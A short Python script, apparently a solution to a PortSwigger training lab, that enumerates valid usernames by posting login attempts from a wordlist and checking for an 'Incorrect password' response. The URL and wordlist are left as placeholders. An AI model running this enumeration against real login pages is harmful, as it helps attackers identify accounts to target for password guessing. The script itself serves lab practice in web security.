import requests

# Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

url = "link"
p_usernames = "wordlist"
valid_usernames = []
for user in p_usernames:
    login = requests.post(url, data={'username' : f'{user}', 'password': 'test'})
    
    if "Incorrect password" in login.text:
        valid_usernames.append(user)
        print(f'{valid_usernames[-1]}')